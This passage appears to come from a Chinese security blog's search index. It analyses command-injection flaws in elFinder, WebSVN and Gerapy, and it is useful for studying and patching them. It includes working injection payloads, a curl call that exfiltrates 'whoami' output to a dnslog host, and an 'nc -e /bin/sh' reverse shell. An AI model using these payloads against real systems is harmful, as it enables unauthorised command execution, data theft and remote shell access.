然后在浏览器中加载运行/elfinder.src.html即可 漏洞分析 源码地址： https://github.com/Studio-42/elFinder/releases/tag/2.1.58 得知是通过存档功能，传递name参数造成命令注入，然后进行抓包 可以看出是在connector.minimal.php文件中进行操作 在connector.minimal.php文件中发现，包含文件autoload.php 在autoload.php中，不确定在那个文件，不过通过名字大概率可以在elFinderVolumeLocalFileSystem.class.php和elFinder.class.php中可以找到 先进入elFinderVolumeLocalFileSystem.class.php中，通过抓包得知cmd=archive，可能有archive函数 发现果然有，跟进makeArchive函数 可以看出参数确实是传到makeArchive，但是不是通过_archive传进来的 接下来在elFinder.class.php中尝试 先对name参数进行isset判断，然后传入archive函数中，继续跟进 $name先进行了正则转换后进行了字符串替换，然后先传入到uniqueName中，后传入到remoteArchive中，先跟进到uniqueName中 可以看出是对$name进行了一些转换替换，最后返回$name值 接下来返回上一步，跟进到remoteArchive中 看见参数传入到makeArchive函数中，继续跟进 到这里参数通过escapeshellarg()进行转义，然后拼接其它参数赋值给$cmd，然后进入到procExec函数中 可以看见$cmd被作为参数，放入到proc_open中执行命令 proc_open命令详解如下： 自此整个流程分析完成，虽然中间对参数进行了正则和替换的过滤操作，但是因为程序会将name参数值解析为标志（--foo=bar），可以通过zip的-TT指定要运行的测试命令，如：-TmTT=\"$(id\u003eout.txt)foooo\" 通过测试得到，参数在传入到proc_open中执行命令前，其值为\"zip -r9 -q 'a1.zip' './a.zip'\"，所以我们可以构造成以下命令\"zip -r9 -q '-TmTT=\"$(id\u003eout.txt)foooo\".zip' './a.txt'\"，执行id命令并将结果输出到out.txt中 参考链接 https://github.com/Studio-42/elFinder/commit/a106c350b7dfe666a81d6b576816db9fe0899b17 https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt ","date":"2021-12-07","objectID":"/cve-2021-32682-elfinder-rce/:0:0","tags":[],"title":"CVE-2021-32682 elFinder RCE 简单分析","uri":"/cve-2021-32682-elfinder-rce/"},{"categories":[],"content":"简介 WebSVN是一个基于Web的Subversion Repository浏览器。它将Subverion的各种功能操作通过Web界面提供出来。通过它，可以看到任何给定版本的任何文件或者目录的日志，并且可看到所有文件改动、添加、删除的列表。 漏洞描述 该漏洞源于没有对search.php?search=参数进行严格的过滤，导致参数被带入prox_open中执行，造成命令注入 影响版本 WebSVN \u003c= 2.6.1 环境搭建 本次测试是在vulfocus靶场上测试 可通过以下命令进行拉取docker docker pull 1933pika/cve-2021-32305 docker run -d -p 80:80 1933pika/cve-2021-32305 漏洞分析 WebSVN源码：https://github.com/websvnphp/websvn/releases/tag/2.6.0 我们在search.php中搜索search参数，如下： 会先判断search是否为空值，否的话参数会传入showSearchResults函数中，跟进该函数 变量$searchstring即为原先的search，发现会继续传入到getListSearch函数中，然后继续跟进 在getListSearch函数中，可以看出$searchstring会在1085行中进行拼接，然后先传入svnCommandString中进行操作，然后赋值给$cmd,然后将$cmd传入到_xmlParseCmdOutput函数中，接下来先跟进到_xmlParseCmdOutput函数中 发现$cmd会传入到runCommand函数中，然后继续跟进 变量$cmd先会被进行检测是否有'\u003e‘和’|'，然后作为参数，放入到proc_open中执行命令 proc_open命令详解如下： 自此$_GET[\"search\"]会被当做命令执行，然后回过头来分析svnCommandString函数，看对变量$searchstring做了什么操作 发现只是对$command变量进行了一下拼接，没有额外的过滤 最后进行一下简单的总结，$_GET[\"search\"]传入后，没有经过太严格的过滤，然后传入到proc_open中去执行命令，导致命令注入。 漏洞复现 访问80端口，在url中输入以下内容去执行命令： /search.php?search=\";curl xxx.dnslog.cn;\" DNSLog有回显，命令成功被执行 ","date":"2021-12-04","objectID":"/cve-2021-32305-websvn-rce/:0:0","tags":[],"title":"CVE-2021-32305 Websvn RCE 简单分析","uri":"/cve-2021-32305-websvn-rce/"},{"categories":[],"content":"简介 Gerapy是一款基于Scrapy、Scrapyd、Django和Vue.js的分布式爬虫管理框架。 漏洞描述 该漏洞源于程序没有正确清理通过project_clone端点传递给Popen的输入。攻击者可利用该漏洞执行任意命令。 影响版本 Gerapy \u003c= 0.9.7 环境搭建 执行以下命令进行安装gerapy pip install gerapy==0.9.7 pip install scrapyd 可以通过gerapy检测安装是否成功 先运行scrapyd 然后通过以下命令设置gerapy的相关参数 gerapy init ##初始化 cd gerapy ##进入工作目录 gerapy migrate ##自动创建数据库 gerapy createsuperuser ##设置管理员账号密码 gerapy runserver 0.0.0.0：8000 ##开启服务 设置完成后浏览器访问 漏洞分析 该功能具体实现代码如下： @api_view(['POST']) @permission_classes([IsAuthenticated]) def project_clone(request): \"\"\" clone project from github :param request: request object :return: json \"\"\" if request.method == 'POST': data = json.loads(request.body) address = data.get('address') if not address.startswith('http'): return JsonResponse({'status': False}) address = address + '.git' if not address.endswith('.git') else address cmd = 'git clone {address} {target}'.format(address=address, target=join(PROJECTS_FOLDER, Path(address).stem)) logger.debug('clone cmd %s', mcd) p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read()) logger.debug('clone run result %s', stdout) if stderr: logger.error(stderr) return JsonResponse({'status': True}) if not stderr else JsonResponse({'status': False}) 根据代码可以看出传入的参数address在到popen中去执行shell命令为止，中间都没有进行任何的过滤，导致命令注入。 漏洞复现 登入后台后，如图所示依次点击，项目管理\u003e创建\u003e克隆 然后随意填写通过burp进行抓包 然后在后面拼接上以下命令 ;curl`whoami`.thh0lg.dnslog.cn 查看结果,命令结果成功被外带出来 接下来进行尝试反弹shell 这里使用的是nc -e /bin/sh IP 5555命令，因为在搭建环境中没有/bin/bash，根据环境不同，使用不同的反弹命令 ","date":"2021-11-30","objectID":"/cve-2021-32849-gerapy-rce/:0:0","tags":[],"title":"CVE-2021-32849 Gerapy RCE 简单分析","uri":"/cve-2021-32849-gerapy-rce/"},{"categories":null,"content":"关于自己  热衷于漏洞分析和代码审计 ","date":"0001-01-01","objectID":"/about/:1:0","tags":null,"title":"","uri":"/about/"}]